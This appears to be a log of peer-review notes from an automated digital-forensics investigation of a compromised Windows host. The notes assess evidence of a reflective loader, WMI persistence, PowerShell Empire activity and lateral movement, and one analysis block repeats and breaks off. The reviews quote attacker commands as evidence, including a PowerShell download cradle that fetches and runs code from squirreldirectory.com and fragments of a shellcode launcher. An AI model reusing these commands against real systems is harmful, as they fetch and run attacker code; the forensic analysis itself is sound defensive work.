- "Masquerade path mimicking Windows performance monitoring" — reasonable inference (Perfmon name), but no evidence the attacker explicitly mimicked perfmon.exe vs. just chose a plausible folder name. Minor.

FACT-CHECK
- VT 60/76 with 0 harmless is decisive for malicious classification. Supported.
- YARA-only family attribution correctly downgraded to LIKELY. Compliant with peer-review standard.
- VadS + PAGE_EXECUTE_READWRITE is consistent with malfind's standard injected-code heuristic. Accurate.
- ATT&CK alignment would be T1055 (Process Injection) / T1620 (Reflective Code Loading) / T1036.005 (Masquerading) — not asserted in finding, fine.

ADDITIONAL INVESTIGATION TO UPGRADE
- vol.malfind dump of injected region + yara.scan_memory_image for CS beacon-config patterns (e.g., "ReflectiveLoader", xor key 0x2e/0x69 config blob).
- vol.netscan / correlate.network_to_process on PID 8260 for C2 sockets.
- strings.floss_extract on p.exe for sleep mask, pipe names \\.\pipe\msagent_*, MZARUH header markers.
- If pcap available: net.tcpdump_list_connections filtered by rd-01 to find beacon callbacks; net.http_session_inventory for malleable C2 profiles.

VERDICT: SUPPORTED for "malicious reflective loader on masquerade path." CHALLENGED for the implicit "beacon" wording and the Cobalt Strike-specific family lead, both of which need config decode or network evidence to firm up. The finding's own LIKELY hedge keeps it defensible.

next_hypothesis_triggers: beacon config blob decoded -> upgrade CS attribution from LIKELY to CONFIRMED
C2 socket found on PID 8260 -> justify beacon terminology
named pipe or sleep-mask strings found -> corroborate CS-family vs Meterpreter/Sliver

entries.conclusion:
EVIDENCE SUPPORT
EID 5861 in Microsoft-Windows-WMI-Activity/Operational is the canonical event for permanent WMI event consumer registration (logged when a __FilterToConsumerBinding is established). The cited tool output names __EventFilter "PerformanceMonitor", CommandLineEventConsumer "SystemPerformanceMonitor", the WQL query targeting Win32_PerfFormattedData_PerfOS_System with __InstanceModificationEvent WITHIN 60, and two timestamps. If those fields are present verbatim in the evtxecmd CSV/JSON, the binding registration is supported.

CONTRADICTING EVIDENCE
- The finding states "CommandLineEventConsumer" but the executed command line / ExecutablePath / WorkingDirectory of the consumer is NOT cited. Without the CommandLine field from the 5861 record, the link to C:\Windows\Temp\Perfmon\p.exe is not established by this evidence — it is inferred from naming similarity only.
- Attribution to CRIMSON OSPREY is not supported by anything in the supporting evidence. No actor-linked TTP, infrastructure, or tool overlap is cited.
- "first registered" vs "re-registered" is an interpretation. EID 5861 fires on each registration; the two timestamps could equally be: separate operator activity, a host reboot triggering re-registration of an MOF-compiled subscription, or a reinstall. Nothing cited distinguishes these.

ALTERNATIVE EXPLANATIONS
- Legitimate monitoring agent. SCCM, performance-monitoring products, and several enterprise EDR/management tools register __EventFilter + CommandLineEventConsumer pairs that watch Win32_PerfFormattedData_PerfOS_System uptime to trigger uptime/reboot-related actions. The query shape (SystemUptime threshold) is a known pattern in published WMI persistence PoCs AND in legitimate "run on boot/uptime" scripts.
- The name "PerformanceMonitor" / "SystemPerformanceMonitor" could be operator masquerade, OR a third-party agent. Naming alone is not malicious.
- CreatorSID with RID 1193 simply means a domain user (not SYSTEM/Administrators) created it. That is suspicious for a service-class subscription but consistent with admin-user-installed software.

HALLUCINATION CHECK
- "CRIMSON OSPREY established ... persistence" — attribution is asserted without any cited attribution artifact. HALLUCINATED in this finding's evidence basis.
- "Bound to a CommandLineEventConsumer" — the binding (FilterToConsumerBinding) is implied by EID 5861 but the actual CommandLine of that consumer is not quoted. The link to p.exe is asserted by case context, not by the 5861 record content shown.
- "first registered ... re-registered" — temporal ordering is fine, but "re-registered" implies a known mechanism not evidenced.
- The WQL query is truncated ("SystemUptime...") — the threshold value is not shown. Minor, but the trigger condition is unverified.

FACT-CHECK
- T1546.003 (Windows Management Instrumentation Event Subscription) is correct for __EventFilter + __EventConsumer + __FilterToConsumerBinding persistence.
- EID 5861 in Microsoft-Windows-WMI-Activity/Operational does log permanent event consumer registration including Consumer, Filter, Query, and CreatorSID — this is accurate.
- Default benign consumers (BVTConsumer, SCM Event Log Consumer under NT AUTHORITY\SYSTEM / BUILTIN\Administrators S-1-5-32-544) are correctly characterized as routine baseline.
- CreatorSID "RID 1193" — RID alone does not identify a user; full SID with domain identifier authority is needed. The finding correctly flags this for resolution.

ADDITIONAL INVESTIGATION
- Pull the full EID 5861 record(s) including the CommandLine, ExecutablePath, and consumer Type fields to actually tie the consumer to p.exe.
- Parse OBJECTS.DATA (CIM repository) from disk to confirm the subscription still exists and to recover the literal CommandLine string.
- Resolve the CreatorSID via SAM/ProfileList to identify the user account used.
- Correlate timestamps with logon events (4624) for that SID and with process creation of p.exe.
- Check Amcache/AppCompatCache/MFT for C:\Windows\Temp\Perfmon\p.exe execution and creation timestamps.

VERDICT: CHALLENGED — Evidence supports that a non-default WMI permanent event subscription named PerformanceMonitor/SystemPerformanceMonitor was registered by a non-privileged SID on two dates (suspicious and consistent with T1546.003). However, (a) attribution to CRIMSON OSPREY is unsupported by cited evidence, and (b) the binding to C:\Windows\Temp\Perfmon\p.exe is inferred from naming, not from the consumer's CommandLine field. Downgrade to "suspected WMI persistence pending consumer CommandLine retrieval and SID resolution."

next_hypothesis_triggers: If consumer CommandLine in OBJECTS.DATA references p.exe, upgrade to confirmed persistence-to-implant binding
If CreatorSID resolves to a known compromised account with 4624 logon at registration timestamps, supports operator action
If CreatorSID resolves to a local admin with legitimate software install history, downgrade to benign/third-party

entries.content: The gate parsed verdict 107 as CHALLENGED (the "beacon"/CS wording). I'll re-evaluate a tightened finding scoped exactly to what the reviewer called SUPPORTED — "malicious reflective loader on a masquerade path" — dropping "beacon"/CS-family from the claim itself.

entries.conclusion:
EVIDENCE SUPPORT
- VT 60/76 malicious is strong third-party reputation signal for the SHA256.
- YARA CobaltStrike_ReflectiveDLL match indicates reflective-loader code pattern (lead, not family confirmation — finding correctly avoids family attribution).
- PE32+ x86-64 stripped consistent with loader/implant builds.
- vol.malfind hit on PID 8260 with PAGE_EXECUTE_READWRITE VadS region is the standard signature for injected/loaded code in private memory.
- Path C:\Windows\Temp\Perfmon\p.exe — Perfmon is not a standard Windows directory under Temp; single-letter binary name in Temp is a classic masquerade/staging pattern.

CONTRADICTING EVIDENCE
- None presented. No evidence shown that vol.malfind output included disassembly (MZ header, indirect jumps, shellcode prologue) which would strengthen the RWX-region characterization beyond a tag.

ALTERNATIVE EXPLANATIONS
- PAGE_EXECUTE_READWRITE private regions alone occur in many legitimate JIT-using processes (.NET, browsers, Java). Here the process is a stripped PE in Temp with VT 60/76 + YARA reflective hit, so benign JIT is implausible — but the RWX VAD by itself is not proof of injection.
- T1055 (Process Injection) technically requires injection into another process or self-mapped reflective load. A stripped PE allocating its own RWX region could be self-loading shellcode (T1620 Reflective Code Loading) which is a better-fitting technique than T1055.

HALLUCINATION CHECK
- Claim of "reflective-loader executable" rests on a YARA rule name. Rule name CobaltStrike_ReflectiveDLL is a lead; the finding correctly downgrades to generic "reflective loader" rather than naming Cobalt Strike — acceptable.
- "Executing with a PAGE_EXECUTE_READWRITE private memory region" — supported by vol.malfind hit, but no excerpt of the malfind output (VAD tag, protection, hexdump) is quoted. Mild specificity gap.
- T1055 attribution is questionable; T1620 is the more precise ATT&CK ID for reflective code loading within the same process. Flag for correction.

FACT-CHECK
- T1036.005 (Match Legitimate Name or Location) — correct technique for Temp\Perfmon\p.exe masquerade.
- T1055 (Process Injection) — overclaimed without evidence of cross-process injection. T1620 Reflective Code Loading is the accurate sub-technique given the YARA reflective signature and self-process RWX region.
- VT 60/76 + YARA reflective + stripped PE + RWX VAD + Temp masquerade path is a reasonable convergence to call the binary malicious. The "malicious" conclusion is supported.

ADDITIONAL INVESTIGATION
- vol.malfind raw excerpt for PID 8260 (VAD tag, protection, hexdump showing MZ or shellcode prologue) to firmly anchor reflective-load behavior.
- vol.vadinfo / vol.vadwalk for PID 8260 to enumerate all RWX regions.
- correlate.mitre_validate on T1055 vs T1620 to confirm technique mapping.
- hash.hash_file + strings.strings_grep on p.exe for loader strings; yara.scan_memory_image of PID 8260 to confirm in-memory reflective artifacts.

VERDICT: SUPPORTED with correction — malicious reflective loader on masquerade path is supported by convergent evidence. T1055 mapping should be replaced/supplemented with T1620 (Reflective Code Loading); T1036.005 is correct.

next_hypothesis_triggers: replace T1055 with T1620 if no cross-process injection target found
if vol.vadinfo shows additional RWX regions with MZ headers, escalate to in-memory module enumeration
if yara.scan_memory_image hits beacon/config signatures in PID 8260, consider family attribution

entries.conclusion:
1. EVIDENCE SUPPORT
- WMI persistence: ez.evtxecmd Microsoft-Windows-WMI-Activity/Operational EID 5861 explicitly logs CommandLineEventConsumer creation with binding to __EventFilter. Filter name "PerformanceMonitor" and consumer "SystemPerformanceMonitor" come from this output. This is the canonical WMI persistence telemetry — strong support for T1546.003.
- Command line: CommandLineTemplate field in EID 5861 captures the powershell -W Hidden -nop -noni -ec <base64>. Base64 decode (UTF-16LE per PowerShell -EncodedCommand spec) yielding IEX (New-Object System.Net.WebClient).downloadstring('http://squirreldirectory.com/a') is technically correct decoding methodology. Supports T1059.001 and the download cradle characterization.
- C2 attribution: URL string is literal in decoded command. T1071.001 (Application Layer Protocol: Web) is appropriate.
- Creator identity: CreatorSID byte array decoded to RID 1193, then ProfileList registry mapping S-1-5-21-...-1193 -> spsql. Standard SID-to-user resolution; sound methodology.
- Timestamps: derived from EID 5861 TimeCreated; reliable.

2. CONTRADICTING EVIDENCE
- None presented. The two timestamps (creation + re-registration) are consistent with the persistence narrative.

3. ALTERNATIVE EXPLANATIONS
- "SystemPerformanceMonitor"/"PerformanceMonitor" naming is a classic masquerading choice (T1036) — unlikely to be a legitimate admin tool given the base64-encoded WebClient downloadstring payload. Benign explanation effectively excluded by the decoded command content.
- spsql could theoretically be a compromised service account rather than the human actor; the finding correctly attributes the SID but does not overclaim human intent.

4. HALLUCINATION CHECK
- CreatorSID byte array shown as "{1,5,...,21,...,169,4,0,0}" — the "169,4,0,0" little-endian = 0x4A9 = 1193. Math checks out.
- Domain authority RID portion (3445421715-2530590580-3149308974) appears only in the ProfileList mapping output, not re-derived from the byte array snippet shown; reasonable since the SID-to-username join is the proof, not byte-level reconstruction.
- "re-registered 2018-09-06 20:27:58" — EID 5861 fires on each registration; calling the second event "re-registration" is reasonable but could also be a second distinct subscription with same names. Minor — does not change finding.
- Squid proxy egress path (172.16.4.10:8080) is stated in case context, not in this finding's evidence — finding does not claim to have observed the proxy traffic itself, so no overclaim here.

5. FACT-CHECK
- T1546.003 (WMI Event Subscription), T1059.001 (PowerShell), T1071.001 (Web Protocols) — all valid ATT&CK IDs and correctly applied.
- EID 5861 is the correct event for permanent WMI event consumer registration on modern Windows — accurate.
- PowerShell -EncodedCommand uses UTF-16LE base64 — accurate decoding approach.
- SID RID extraction from little-endian DWORD at the tail of the binary SID structure — accurate.
- No negative claims requiring exhaustive-collection scrutiny.

6. ADDITIONAL INVESTIGATION
- Confirm execution actually occurred: search Squid access logs (or pcap) for GET http://squirreldirectory.com/a from rd-01's source, and PowerShell Operational EID 4104/4103 for the decoded IEX cradle.
- Pull the MOF or root\subscription namespace via offline registry/OBJECTS.DATA to verify the subscription is still present (or was removed).
- Correlate spsql logon sessions (4624 type 3) at 2018-08-30 18:31:10 and 2018-09-06 20:27:58 to confirm interactive vs remote creation.

7. VERDICT: SUPPORTED — EID 5861 with consumer command captured, base64 decoded to explicit C2 URL, CreatorSID resolved to spsql via ProfileList. Persistence, execution mechanism, and C2 attribution are all directly evidenced. Execution proof (actual HTTP request) would strengthen the C2 callback claim but is not required to support the persistence finding itself.

next_hypothesis_triggers: HTTP GET to squirreldirectory.com/a observed from 172.16.4.10 (Squid) sourced by rd-01 confirms execution
PowerShell 4104 script-block containing decoded IEX cradle confirms in-process execution
spsql 4624 logon session at 2018-08-30 18:31:10 distinguishes interactive vs remote WMI creation

entries.content:
The PowerShell 4104 logs expose the full **PowerShell Empire** operation:
- **2018-08-28 15:42:38** — first stager `IEX ((new-object net.webclient).downloadstring('http://squirreldirectory.com/a'))` → earliest rd-01 compromise.
- Base64-gzip **shellcode injection** (`VirtualAlloc`, `start-job -RunAs32 IEX $DoIt`, `/OiJAAAA…` Empire/Meterpreter stub) at 15:42 and again at the **16:43 WMI exec**.
- **2018-08-30 18:31** — Empire `Install-Persistence`/`check-WMI` module registers the `PerformanceMonitor` WMI subscription (matches the persistence finding), plus local-agent `DownloadString http://127.0.0.1:<port>/`.
- **21:40** — `cp pa.exe pb.exe; pa.exe`.

tdungan's OneDrive `Research/` holds R&D IP (carbon-nanotube/alloy papers) plus `CONFIDENTIAL - Project Mayhem.pptx` and `Tax Returns` — the collection/exfil target. Evaluating the enterprise lateral-movement and Empire-C2 findings.

entries.conclusion:
ANALYSIS

1. EVIDENCE SUPPORT
The finding cites ez.recmd_hive parsing of rd-01's SYSTEM hive AppCompatCache, producing CSV rows with UNC paths to \\IP\c$\Windows\Temp\perfmon\*.exe. ShimCache (AppCompatCache) recording UNC paths is a well-documented artifact of execution attempts traced from the recording host. The five hosts and binary names cited match the supporting evidence list. ATT&CK T1021.002 (SMB/Windows Admin Shares) and T1570 (Lateral Tool Transfer) are valid technique IDs and apply correctly to admin share + remote tool drop behavior.

2. CONTRADICTING EVIDENCE
- ShimCache "execution" semantics are nuanced. On Win8+/Server 2012+, ShimCache entries can be created by file existence/metadata queries (e.g., file browsing, AV scans, dir listings) — not solely by execution. The finding asserts "UNC execution" as fact. Without OS version of rd-01 confirmed and without corroborating Amcache/Prefetch/4624+4688 evidence, "execution" is overclaimed.
- The ShimCache timestamps are file standard-information last-modified times, NOT execution times. Stating "(2018-09-05 14:05:28)" alongside UNC paths implies execution time, which is incorrect.
- No corroborating evidence (Security 4624 Type 3 logons from rd-01, 5140/5145 share access, Amcache, Prefetch \\?\UNC\ entries) is cited to confirm lateral movement actually occurred from rd-01.

3. ALTERNATIVE EXPLANATIONS
- An administrator or AV/EDR sweep browsing \\host\c$\Windows\Temp\Perfmon\ would touch the files and could populate ShimCache on rd-01 without execution.
- A responder or sysadmin manually inspecting suspect hosts post-compromise could produce identical artifacts.
- rd-01 may itself be the staging origin where the operator mounted remote C$ shares to push tools — that is still consistent with T1021.002/T1570, but the directionality (rd-01 as source) is an inference not directly proven by ShimCache alone.

4. HALLUCINATION CHECK
- "UNC execution of the toolkit" — overstated. ShimCache does not prove execution on modern Windows.
- Timestamps presented as if they are execution times — ShimCache timestamps are $SI modified times of the referenced binary, not execution timestamps. This is a factual error in interpretation.
- Attribution to "CRIMSON OSPREY" — no evidence in this finding ties the artifacts to that actor; it appears imported from prior case context not shown here.
- "local \\172.16.6.11\c$\..." described as "local" — 172.16.6.11 is rd-01 itself per case context, so a UNC self-reference in ShimCache is unusual and worth noting, but the finding doesn't explain why a local host appears via UNC.

5. FACT-CHECK
- T1021.002 and T1570 IDs verified valid.
- ShimCache UNC path recording is real and indicates the recording host's kernel resolved that path — strong lateral movement indicator but not standalone execution proof.
- ShimCache timestamp semantics misrepresented (see above).

6. ADDITIONAL INVESTIGATION
- ez.amcacheparser on rd-01 Amcache.hve to confirm execution (Amcache records actual execution with SHA1).
- ez.pecmd on rd-01 Prefetch for ri.exe/csrss.exe/PerfView.exe/volrest.exe/p.exe and any \VOLUME{}\ UNC prefetch entries.
- ez.evtxecmd on rd-01 Security.evtx for 4648 (explicit creds), and on target hosts 4624 Type 3, 5140/5145 share access for \\Windows\Temp\Perfmon\.
- hash.hash_file + yara.scan_file against the dropped binaries if recoverable.
- ez.recmd_hive on rd-01 NTUSER MountPoints2 / Map Network Drive MRU for evidence of admin share mounting.

7. VERDICT: CHALLENGED
Strong lead for lateral tool staging, but the finding overstates ShimCache as proof of execution and misuses ShimCache timestamps as execution times. Corroboration via Amcache/Prefetch/Security logs required before asserting execution.

next_hypothesis_triggers: Amcache confirms execution of ri.exe/csrss.exe/PerfView.exe/volrest.exe/p.exe on rd-01
Prefetch contains UNC-prefixed entries for the staged binaries
Security 4648/4624 Type 3 from rd-01 to 172.16.4.5/4.6/7.15/6.14 within the ShimCache time window
5140/5145 events on target hosts referencing \Windows\Temp\Perfmon share access
NTUSER MountPoints2 on rd-01 shows admin C$ shares to target IPs

ANALYSIS

1. EVIDENCE SUPPORT
The finding cites ez.recmd_hive parsing of rd-01's SYSTEM hive AppCompatCache, producing CSV rows with UNC paths to \\IP\c$\Windows\Temp\perfmon\*.exe. ShimCache (AppCompatCache) recording UNC paths is a well-documented artifact of execution attempts traced from the rec

entries.conclusion:
EVIDENCE SUPPORT
- 4104 ScriptBlock entries cited from ez.evtxecmd call 155 directly contain the stager IEX with squirreldirectory.com URL, the base64-gzip + start-job -RunAs32 IEX $DoIt pattern (classic Empire launcher), the Install-Persistence routine with PerformanceMonitor WMI filter name, and the local 127.0.0.1:<port> DownloadString pattern. These four together are highly characteristic of PowerShell Empire.
- ATT&CK T1059.001 (PowerShell) and T1071.001 (Application Layer Protocol: Web Protocols) IDs are valid and appropriately mapped.
- WMI persistence via __EventFilter named PerformanceMonitor is documented in Empire's Install-Persistence module.

CONTRADICTING / WEAKENING EVIDENCE
- No network corroboration cited (no pcap, no netscan to squirreldirectory.com resolution, no actual outbound connection log). C2 beaconing is asserted but only the stager URL string in script content is shown — no proof the download actually occurred or beacon traffic exited the host.
- No process/parent-child evidence cited (no vol.pstree, no 4688, no Sysmon 1) to tie the 4104 events to a specific powershell.exe PID, user context, or parent process.
- "Initial access to rd-01" at 2018-08-28 15:42:38 is asserted but no logon/4624, no delivery vector (email, RDP, lateral movement source) is shown. The stager could have been executed by an already-present actor or via lateral movement from another host.

ALTERNATIVE EXPLANATIONS
- 4104 events can be logged from script content loaded for analysis (e.g., AV/EDR scanning a malicious file, IR responder pasting into ISE). Unlikely here given the volume and the local-agent pattern, but the absence of execution corroboration leaves it open.
- The 127.0.0.1:<port> pattern is consistent with Empire's local agent but also occurs in other red-team frameworks and in legitimate local web testing — corroboration via process tree strengthens this.

HALLUCINATION CHECK
- "Beaconing to C2 squirreldirectory.com" — overclaim. Evidence shows the stager string referencing the URL, not observed beacon traffic. Needs pcap/netscan.
- "VirtualAlloc … shellcode injection" — the shellcode bytes /OiJAAAAYInlMdJ… are cited but VirtualAlloc specifically is not shown in the excerpt. Empire's launcher does call VirtualAlloc, but the supporting evidence excerpt does not contain that API name. Minor overclaim of specificity.
- "Initial access" framing — not directly supported; only "first observed stager" is supported.
- Port numbers 54709, 4092, 49953 are quoted from the log excerpts and appear consistent.

FACT-CHECK
- T1059.001 and T1071.001: valid IDs, correctly applied.
- PerformanceMonitor as Empire's default __EventFilter name: accurate.
- start-job -RunAs32 with $DoIt variable: matches Empire's invoke-shellcode/launcher template.
- WMI persistence would more precisely map to T1546.003 (Event Triggered Execution: WMI Event Subscription) — this technique is missing from the finding's mapping.

ADDITIONAL INVESTIGATION
- vol.netscan / pcap analysis for outbound to squirreldirectory.com to confirm actual C2 (not just stager string).
- vol.pstree + vol.cmdline to identify the powershell.exe PID, parent, and user context.
- ez.evtxecmd Security 4624/4688 around 2018-08-28 15:42:30–15:42:40 for delivery vector.
- Registry/WMI repository parse to confirm the __EventFilter+__EventConsumer pair persisted on disk.
- yara.scan_memory_image for Empire agent signatures to corroborate in-memory presence.

VERDICT: SUPPORTED (with scope correction) — PowerShell Empire activity on rd-01 is well-supported by the 4104 content; however, "beaconing C2" and "initial access" are overclaims pending network and logon corroboration, and the WMI persistence should also map to T1546.003.

next_hypothesis_triggers: confirm outbound to squirreldirectory.com via netscan/pcap to upgrade beaconing claim
identify powershell.exe PID + parent for delivery vector
map WMI persistence to T1546.003 once OBJECTS.DATA confirms filter+consumer pair
check 4624/4688 around 15:42:30 to determine initial access vector

entries.conclusion:
Analysis

The unresolved question is binary in two dimensions: (1) did exfiltration actually occur (staging on OneDrive is confirmed, but a SYNC/UPLOAD event is not), and (2) which principal — spsql (service account already tied to WMI persistence) or nromanoff (not yet placed in the chain) — owns the keyboard at the decisive moments. The examined-list is heavy on system-global artifacts (memory, hives, $MFT, Security.evtx) but light on per-user and per-application transfer telemetry. That is exactly where attribution + exfil confirmation live.

High-value gaps, ranked by expected information gain:

1. SRUM (SOFTWARE\Microsoft\Windows NT\CurrentVersion\SRUM, ESE DB at \Windows\System32\sru\SRUDB.dat). Provides per-user-SID, per-application network bytes sent/received in 60-min buckets. A OneDrive.exe / svchost (BITS) egress spike bound to tdungan's or spsql's SID is the closest thing to a smoking gun for actual transfer of the staged Project Mayhem files. Also captures p.exe egress totals to corroborate Empire vs. exfil channels.

2. OneDrive SyncDiagnostics.log + SyncEngine telemetry + the per-user ClientPolicy / business1 ODB SQLite databases (under %LOCALAPPDATA%\Microsoft\OneDrive\settings\...). These actually log upload completion per file with timestamps and account binding (which AAD identity owned the sync). This converts "files in OneDrive folder" into "files uploaded to cloud tenant," and tells us whether tdungan, nromanoff, or another principal's OneDrive client did the push.

3. NTUSER.DAT for nromanoff specifically (UserAssist GUI-launch counts, RecentDocs, TypedPaths, MountPoints2, ComDlg32\OpenSavePidlMRU). spsql is a service account — UserAssist there should be sparse. If nromanoff's UserAssist shows powershell.exe/p.exe/procdump launches or RecentDocs of Project Mayhem files, attribution flips to an interactive human principal; if barren, spsql/Empire ownership is reinforced. This is the single best attribution-flipper.

4. USN Journal $J — captures the file-creation/rename/delete cadence inside the OneDrive folder including transient .tmp upload artifacts and post-upload deletions that $MFT alone smooths over. Also reveals whether files were copied in from \Temp\Perfmon\ stage and when. Pairs with SRUM bucket times.

5. setupapi.dev.log plus MountedDevices/MountPoints2 — included because removable media is an untested alternate exfil channel and would also reveal an ingress HID/BadUSB vector that an egress-only Empire lens missed. Lower probability given C2 is established, but cheap and decisive if positive.

DC/file-server images are out of scope for rd-01 and should be deferred.

Next-hypothesis triggers I'd watch for: SRUM showing OneDrive.exe bytes-sent in the hundreds of MB during the staging window; SyncDiagnostics naming a non-tdungan account; nromanoff UserAssist containing offensive tooling; $J showing .tmp→final rename pattern consistent with completed cloud upload.

next_hypothesis_triggers: SRUM shows OneDrive.exe or BITS bytes-sent >50MB bound to tdungan or spsql SID within staging window -> exfil confirmed
SyncDiagnostics.log records successful upload of Project Mayhem filenames with account != tdungan -> attribution pivot
nromanoff NTUSER UserAssist contains powershell.exe/p.exe/procdump.exe or RecentDocs of R&D IP files -> interactive principal established, attribution flips from spsql service context
USN $J shows .tmp->final rename sequence inside OneDrive folder post-staging -> completed cloud upload corroborated
setupapi.dev.log shows mass-storage or HID device insertion in window with MountPoints2 hit under nromanoff -> alternate exfil/ingress channel opens new line

entries.conclusion:
LOGIC AND CONFIDENCE CHECK

1. LOGICAL GAPS
- Empire -> p.exe linkage: The narrative treats Empire and p.exe as one chain ("WMI->PowerShell Empire->p.exe"), but no cited artifact ties the PowerShell agent process to spawning/injecting p.exe (PID 8260). No parent-child evidence (4688, Sysmon 1, vol.pstree showing powershell->p.exe) is cited. Without that, p.exe execution path is its own finding, not a downstream of Empire.
- p.exe origin on disk: How p.exe arrived in C:\Windows\Temp\Perfmon\ is unevidenced. No MFT $SI/$FN timestamps, USN, or copy-source cited despite ez.mftecmd being in scope.
- spsql -> WMI persistence registration: Persistence finding asserts spsql registered the __EventFilter at 2018-08-30 18:31:10, but the corroborating WMI-Activity 5861 event with the SID/process is not explicitly cited.
- nromanoff activity on rd-01: Auth is shown but no follow-on action (process creation, file write, registry change) is tied to that session. The leap from "authenticated" to "actor-operated" is via rd-04 toolkit possession, not via rd-01 evidence.
- Lateral staging direction: ShimCache shows the toolkit path executed locally on rd-01, but the claim that those same paths existed on remote C$ shares of 172.16.4.5/4.6/7.15/6.14 needs the remote-host artifact, not rd-01 ShimCache. ShimCache on rd-01 only proves local execution context.

2. CONTRADICTIONS
- Persistence registered 2018-08-30 18:31:10, but Empire stager first observed 2018-08-28 15:42:38 and the spsql WMI lateral logon is 2018-08-30 16:43:36. Two-day gap between initial Empire activity and persistence registration is not explained — was there earlier Empire activity by a different principal, or was rd-01 re-compromised? Not a hard contradiction but unreconciled.

3. TIER VIOLATIONS
- "Cobalt Strike family LIKELY" inside a CONFIRMED finding: the family attribution rests on a YARA rule name + VT score. That is SUSPECTED tier for family attribution. The maliciousness is CONFIRMED (VT 60/76 + RWX + path), but "Cobalt Strike family" should be downgraded to SUSPECTED.
- "PowerShell Empire agent" CONFIRMED: 4104 content (Invoke-Empire launcher signatures, Install-Persistence, check-WMI) is strong, but Empire-family attribution from script content is SUSPECTED-to-LIKELY tier, not CONFIRMED. The execution of obfuscated PowerShell with IEX/downloadstring to squirreldirectory.com is CONFIRMED; the Empire-framework label is LIKELY.
- "Remote WMI lateral execution … by spsql from 172.16.4.5" LIKELY is appropriately tiered, but the second-precision correlation (logon second == WmiPrvSE->powershell spawn second) is strong enough to push to CONFIRMED if 4688 ParentProcess=WmiPrvSE.exe is actually cited. Verify citation; otherwise LIKELY stands.

4. TIER CONTRADICTIONS
- None between findings of the same mechanistic claim at different tiers in this list.

5. OVERCLAIMED MECHANISMS
- "WMI->PowerShell Empire->p.exe chain" in the coverage self-correction states this as resolved truth, but findings only support WMI->PowerShell(Empire-like). The arrow to p.exe is unevidenced (see Gap #1).
- "actor-operated from a compromised host" for rd-04: presence of toolkit on rd-04 + auth from rd-04 IP is correlation, not proof of operator control. Phrase should be "consistent with."
- ProcDump SUSPECTED -> T1003: execution is evidenced (AppCompache/Amcache), but no dump file output, no lsass handle, no target process cited. Mapping to Credential Dumping is the right MITRE category but the mechanism (lsass dump) is unproven. Keep SUSPECTED.

entries.conclusion:
LOGIC AND TIER CHECK

1. LOGICAL GAPS
- p.exe execution-on-disk artifact not cited. CONFIRMED tier is supported by VT/YARA/parent-chain in memory; a Prefetch/Amcache/UserAssist or 4688/Sysmon-1 hit anchoring first-execution timestamp is not listed. Memory parent chain is LIKELY-tier evidence for execution, not CONFIRMED-tier. Acceptable if Amcache/Prefetch was checked and absent — that absence is not stated.
- WMI persistence "registered 2018-08-30 18:31:10, re-registered 2018-09-06" — re-registration date is later than the 2018-08-30 image. Source of the 09-06 timestamp is not cited and may be out-of-scope for this image.
- spsql lateral-in finding cites Security 4624 + WmiPrvSE→powershell timing but does not cite the WMI-Activity 5857/5858 operation that ties the 4624 to a remote WMI invocation specifically (vs. interactive/RDP that happened to spawn powershell). Mechanistically thin for "Remote WMI."
- nromanoff "actor-operated from rd-04" — rd-04 host not triaged; the linkage is inference from toolkit path strings observed on rd-01, not from rd-04 artifacts.
- ProcDump → credential access: no LSASS target argument cited (cmdline, Sysmon-10, or .dmp artifact). Currently only presence + execution time.

2. CONTRADICTIONS
- None material. spsql vs. nromanoff dual-principal is presented as complementary, not conflicting.

3. TIER VIOLATIONS
- "p.exe ... is a malicious reflective-loader" at CONFIRMED is defensible (file hash + VT + YARA + RWX in live memory = artifact + corroboration). Keep CONFIRMED for maliciousness; the Cobalt Strike attribution is already correctly held at SUSPECTED. No violation here, but ensure the report does not let "CONFIRMED malicious reflective loader" bleed into "CONFIRMED Cobalt Strike."
- "rd-01 executed obfuscated PowerShell download-cradles to ... squirreldirectory.com" CONFIRMED — supported by 4104 script-block content. OK.
- "WMI event-subscription persistence ... CreatorSID RID 1193 = spsql" CONFIRMED — supported by WMI-Activity 5861 + ProfileList SID mapping. OK.
- Scope summary marked LIKELY is appropriate (composite of mixed-tier findings).

4. TIER CONTRADICTIONS
- spsql appears as the CreatorSID of the WMI persistence (inside a CONFIRMED finding) and as the remote-WMI lateral actor (LIKELY finding). Same principal, same mechanism family (WMI), different tiers. Acceptable because the claims are distinct (persistence creation vs. lateral logon attribution), but the report must phrase them so the CONFIRMED CreatorSID is not read as CONFIRMED remote-WMI lateral by spsql. Flag as wording risk, not a tier contradiction.

5. OVERCLAIMED MECHANISMS
- "Lateral tool transfer indicator ... ShimCache references ... remote C$" — ShimCache records local execution context of paths; it does not by itself prove the path was a remote C$ share at execution time. Tier (LIKELY) is correct, but the mechanism wording "on remote C$" overclaims what ShimCache proves. Recommend rewording to "ShimCache entries with UNC/remote-host path strings referencing 172.16.4.5/4.6/6.14/7.15 \Temp\Perfmon\ toolkit."
- "ProcDump ... credential-access tooling" — tool identity is confirmed, credential-access purpose is inferred. SUSPECTED tier is correct; ensure report does not call this "credential dumping" without an LSASS target or .dmp artifact.

6. MISSING INVESTIGATION / EVIDENCE EXHAUSTION
- Amcache.hve and Prefetch for p.exe execution timestamp — not cited. If checked and absent, state so; if not checked, this is a gap on the central CONFIRMED finding.
- UserAssist / BAM / DAM for spsql and nromanoff execution context on rd-01 — not cited.
- Exfil channel exhaustion: OneDrive refuted; HTTP proxy logs, SMB outbound, DNS tunneling, and BITS not assessed. Stated as tool-gap (SRUM/pcap/Prefetch unavailable). Acceptable as a documented limitation provided the report does not conclude "no exfil" — current wording ("exfiltration UNCONFIRMED") is correct. Not a blocker.
- Suspect-list cross-reference: spsql and nromanoff identities surfaced; case actor CRIMSON OSPREY noted via attribute_actors. Was a case suspect/insider list cross-referenced against tdungan (whose Dashlane folder hosted ProcDump and whose OneDrive holds Project Mayhem)? tdungan is a third named identity tied to attacker tooling and sensitive data but is not characterized as victim, witting, or unwitting. This is an EVIDENCE EXHAUSTION gap on identity attribution.
- WMI-Activity 5857/5858 to bind the spsql 4624 to a remote WMI call (vs. coincidental logon) — not cited.

BLOCKERS
- tdungan role not resolved despite being the account hosting ProcDump and the sensitive R&D data; suspect-list / HR-context cross-reference appears not done.
- p.exe first-execution disk artifact (Amcache/Prefetch/UserAssist) not cited under a CONFIRMED execution claim; must either cite or explicitly state checked-and-absent.

ADVISORIES
- Tighten ShimCache "remote C$" phrasing to "UNC/remote-path strings."
- Bind spsql 4624 to WMI-Activity 5857/5858 to harden the Remote-WMI lateral claim.
- Confirm provenance of the 2018-09-06 WMI re-registration timestamp or drop it (image is 2018-08-30).
